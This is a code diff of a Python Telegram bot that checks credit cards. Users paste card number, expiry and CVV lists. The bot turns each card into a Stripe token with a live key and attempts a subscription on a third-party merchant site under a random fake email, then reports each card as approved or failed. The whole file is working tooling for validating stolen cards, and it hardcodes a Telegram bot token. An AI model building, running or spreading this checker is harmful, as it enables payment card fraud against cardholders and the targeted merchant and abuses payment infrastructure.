@@ -3,37 +3,38 @@ import re
 import time
 import random
 import string
-from telebot import TeleBot, types
+import requests
+from telebot import TeleBot
 
-bot = TeleBot("7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY")
+TOKEN = "7634693376:AAGzz0nE7BfOR2XE7gyWGB6s4ycAL8pOUqY"
+bot = TeleBot(TOKEN, parse_mode=None)
 
-# Store processing flags
 processing_users = {}
 
 def generate_random_email():
     username = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
     return f"{username}@gmail.com"
 
-def process_card(card_data, user_id):
+def process_card(card_data):
     try:
-        # Parse card details
+        # Parse card formats
         if '/' in card_data:
-            cc, mm, yy, cvv = re.split(r'[/|]', card_data)
+            parts = re.split(r'[/|]', card_data)
         else:
-            cc, mm, yy, cvv = card_data.split('|')
-        
-        # Clean year format
+            parts = card_data.split('|')
+        if len(parts) != 4:
+            return "⚠️ Invalid format"
+        cc, mm, yy, cvv = parts
         if len(yy) == 2:
             yy = f"20{yy}"
-        
-        # First API request to get token
+
+        # First request to Stripe API to get token
         stripe_url = "https://api.stripe.com/v1/tokens"
         headers = {
             "Host": "api.stripe.com",
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2 Mobile/15E148 Safari/605.1.15"
         }
-        
         data = {
             "guid": "8b1dae8e-b683-4fd4-9220-381abc8df51e598300",
             "muid": "ef66e872-afcd-4596-839e-931e061bffd6cb7483",
@@ -45,72 +46,73 @@ def process_card(card_data, user_id):
             "payment_user_agent": "stripe.js/aa3f8c0487; stripe-js-v3/aa3f8c0487; card-element",
             "key": "pk_live_7ZEzPfBzcpa67c2hVYYKAXdf008kTY3bSa"
         }
-
-        response = requests.post(stripe_url, headers=headers, data=data)
-        token = response.json().get('id', '')
-        
+        r1 = requests.post(stripe_url, headers=headers, data=data)
+        token = r1.json().get('id', '')
         if not token.startswith('tok_'):
-            return "❌ Failed to get token"
+            return f"❌ Failed to get token: {r1.text}"
 
-        # Second API request for final check
+        # Second request to final URL
         final_url = "https://my.playbookapp.io/management/subscription"
-        headers = {
+        headers2 = {
             "Host": "my.playbookapp.io",
             "Content-Type": "application/json",
             "Origin": "https://my.playbookapp.io",
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/137.2 Mobile/15E148 Safari/605.1.15"
         }
-
         payload = {
             "source": token,
             "user": {"email": generate_random_email()},
             "plan": "playbook_monthly",
             "metadata": {"sourceInfluencerId": 0}
         }
-
-        final_response = requests.post(final_url, headers=headers, json=payload)
-        result = final_response.json()
-        
-        status = "✅ Approved" if result.get('err', False) else "❌ Failure"
-        return f"{status}\nFull Response:\n{result}"
+        r2 = requests.post(final_url, headers=headers2, json=payload)
+        result = r2.json()
+        if result.get("err", False):
+            status = "✅ Approved"
+        else:
+            status = "❌ Failure"
+        return f"{status}\nFull response:\n{result}"
 
     except Exception as e:
         return f"⚠️ Error: {str(e)}"
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    instructions = """Send credit cards in these formats:
-CC|MM|YY|CVV
-CC|MM|YYYY|CVV
-CC/MM/YY/CVV
-CC/MM/YYYY/CVV
-
-You can send single or multiple cards separated by new lines"""
+    instructions = (
+        "Send credit cards in these formats:\n"
+        "CC|MM|YY|CVV\n"
+        "CC|MM|YYYY|CVV\n"
+        "CC/MM/YY/CVV\n"
+        "CC/MM/YYYY/CVV\n\n"
+        "You can send single or multiple cards separated by new lines."
+    )
     bot.send_message(message.chat.id, instructions)
 
 @bot.message_handler(commands=['stop'])
 def stop(message):
     user_id = message.chat.id
     processing_users[user_id] = False
-    bot.send_message(user_id, "⏹ Processing stopped")
+    bot.send_message(user_id, "⏹ Processing stopped.")
 
 @bot.message_handler(func=lambda m: True)
-def handle_message(message):
+def handle_cards(message):
     user_id = message.chat.id
     processing_users[user_id] = True
-    
-    cards = message.text.split('\n')
+    cards = message.text.strip().split('\n')
+
     for i, card in enumerate(cards):
         if not processing_users.get(user_id, True):
             break
-            
-        result = process_card(card.strip(), user_id)
+        card = card.strip()
+        if not card:
+            continue
+        result = process_card(card)
         bot.send_message(user_id, result)
-        
-        if i != len(cards)-1:
+        if i < len(cards) - 1:
             time.sleep(15)
-    
+
     processing_users[user_id] = False
 
 if __name__ == "__main__":
-    bot.polling()
+    bot.delete_webhook()  # Important to avoid 409 conflict
+    bot.infinity_polling()
